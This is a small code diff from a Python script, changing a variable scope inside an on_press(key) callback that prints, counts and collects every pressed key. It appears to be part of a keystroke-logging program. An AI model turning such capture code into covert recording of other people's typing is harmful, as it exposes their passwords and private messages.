@@ -18,7 +18,7 @@ def run() :
     currenttime = str(ttime)
 
     def on_press(key):
-        global keys, count
+        nonlocal keys, count
         print(key)
         count = count + 1
         keys.append(key)
